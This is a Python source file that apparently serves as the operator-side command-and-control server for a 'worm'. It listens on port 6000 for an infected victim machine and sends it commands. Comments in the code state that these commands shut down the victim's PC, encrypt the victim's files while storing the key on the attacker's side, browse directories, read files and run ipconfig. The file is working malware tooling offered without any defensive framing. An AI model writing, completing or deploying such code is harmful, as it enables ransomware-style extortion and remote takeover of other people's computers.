import socket
#Connect to the worm(client).
print("SERVER\nCommands-->[cd,open file,encrypt,decrypt,shutdown,ipconfig,exit]\nMy hostname: "+socket.gethostname())
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(('0.0.0.0' , 6000))
s.listen(1)
#Enter commands and send them to the worm(function).
def On():    
    msg=input(">>")
    if msg=="shutdown": #Shutdown victim's pc.
        try:
            conn_worm.send(("shutdown").encode())
            result=conn_worm.recv(20000)
            print(result.decode())
            On()
        except Exception as error:
            input(error)
            On()
    elif msg=="encrypt": #Encrypt victim's data.(All the files in path can be encrypted.)
        try:    
            conn_worm.send(("encrypt").encode())
            key=conn_worm.recv(20000)
            with open("worm_key.key","ab") as keyfile:
                keyfile.write(key)
            print("Encrypt key recieved.")
            path=input("Encrypt_file_path>>")
            conn_worm.send(path.encode())
            q=conn_worm.recv(2000)
            print(q.decode())
            On()
        except Exception as error:
            input(error)
            On()
    elif msg=="exit": #Close connection.
        conn_worm.close()
        input("Connection closed.")
        exit()
    elif msg=="cd": #Go to a vicim's pc's directory
        try:
            conn_worm.send(("cd").encode())
            path=input("Path>>")
            conn_worm.send(path.encode())
            print((conn_worm.recv(2000)).decode())
            On()
        except Exception as error:
            input(error)
            On()
    elif msg=="ipconfig": #Ipconfig
        try:
            conn_worm.send(("ipconfig").encode())
            print((conn_worm.recv(2000000)).decode())
            On()
        except Exception as error:
            input(error)
            On()
    elif msg=="decrypt": #Decrypt(Only one file can be decrypted.) 
        conn_worm.send(("decrypt").encode())
        try:
            with open("worm_key.key","rb") as decrypt_key_file:
                decrypt_key=decrypt_key_file.read()
                conn_worm.send(decrypt_key)
                print("Decrypt key sent.")
            pth=input("Decrypt_file_path>>")
            conn_worm.send(pth.encode())
            print((conn_worm.recv(2000)).decode())
        except Exception as error:
            input(error)
        On()    
    elif msg=="open file": #Open a file.
        try:    
            conn_worm.send(("open file").encode())
            path=input("path>>")
            conn_worm.send(path.encode())
            print(conn_worm.recv(2000000).decode())
            On()
        except Exception as error:
            input(error)
            On()
    else:
        print("Invalid command.")
        On()
    input()


conn_worm,addr_worm=s.accept()
print("Worm connected.",addr_worm)
while True:    
    msg_worm=conn_worm.recv(2000)
    print(msg_worm.decode())
    On()


